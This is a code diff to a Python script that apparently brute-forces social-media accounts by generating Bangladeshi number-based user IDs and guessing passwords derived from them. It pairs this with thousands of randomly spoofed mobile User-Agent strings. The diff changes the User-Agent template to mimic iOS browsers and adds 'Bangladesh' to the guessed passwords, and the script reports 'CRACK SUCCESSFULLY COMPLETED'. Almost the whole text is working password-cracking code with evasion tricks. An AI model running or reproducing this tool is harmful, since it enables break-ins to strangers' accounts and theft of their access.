@@ -28,12 +28,12 @@ for ua in range(5000):
       a='Mozilla/5.0 (Linux; Android'
       b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
       y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
-      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+      c='Build/LMY47X; wv) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/'
       d=random.randrange(40,115)
       e='0'
       f=random.randrange(3000,6000)
       g=random.randrange(20,100)
-      h='Mobile Safari/537.36'
+      h='Mobile/15E148 Safari/604'
       ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
       ugen.append(ug)
 for ua in range(5000):
@@ -101,7 +101,7 @@ def fuck():
         print('\033[1;32m─────────────────────────────────────────────────────────')
         for guru in user:
             uid = nude+nudex+nud+guru
-            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla','09876543']
+            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla','09876543','Bangladesh']
             MUEOR.submit(rcrack,uid,pwx,tl)
     print('\033[1;32m─────────────────────────────────────────────────────────')
     print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
